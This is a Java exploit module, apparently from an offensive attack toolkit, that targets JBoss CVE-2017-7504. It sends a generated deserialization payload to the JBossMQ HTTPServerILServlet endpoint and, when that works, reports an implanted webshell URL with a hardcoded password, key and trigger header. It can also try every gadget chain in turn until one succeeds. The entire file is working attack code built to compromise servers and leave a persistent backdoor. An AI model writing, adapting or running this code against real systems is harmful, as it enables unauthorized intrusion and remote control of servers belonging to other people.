package exp.jboss;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import ui.Config;
import utils.Util;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class JBoss_CVE_2017_7504 extends BaseExp implements AttackBase {
    public boolean attack(String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        byte[] payload = null;
        try {
            payload = GeneratePayload.generatePayloadByte(gadgetType, payloadType, trojanType);
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
            header.put("Accept", "*/*");
            String mime = "application/x-www-form-urlencoded";
            this.launchPostByte(stripUrl + "/jbossmq-httpil/HTTPServerILServlet" , payload, mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(stripUrl + "/jbossmq-httpil/HTTPServerILServlet", header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                Util.messageQueue.add(String.format("Gadget： %s\n", gadgetType));
                Util.messageQueue.add(String.format("Shell_Url： %s\n", stripUrl + "/jbossmq-httpil/HTTPServerILServlet"));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
                return true;
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
        return false;
    }

    public void sendAllGadget(String stripUrl, String payloadType, String trojanType){
        for(String gadget: Config.CommonsGadget){
            if (gadget.equalsIgnoreCase("all"))continue;
            if (this.attack(stripUrl, gadget, payloadType, trojanType)){
                break;
            }
        }
    }


    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");
        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = params.get("trojanType");

        String stripUrl = this.getStripUrl(target);

        if (gadgetType.equalsIgnoreCase("all")){
            this.sendAllGadget(stripUrl, payloadType, trojanType);
        }
        else {
            this.attack(stripUrl, gadgetType, payloadType, trojanType);
        }

    }
}
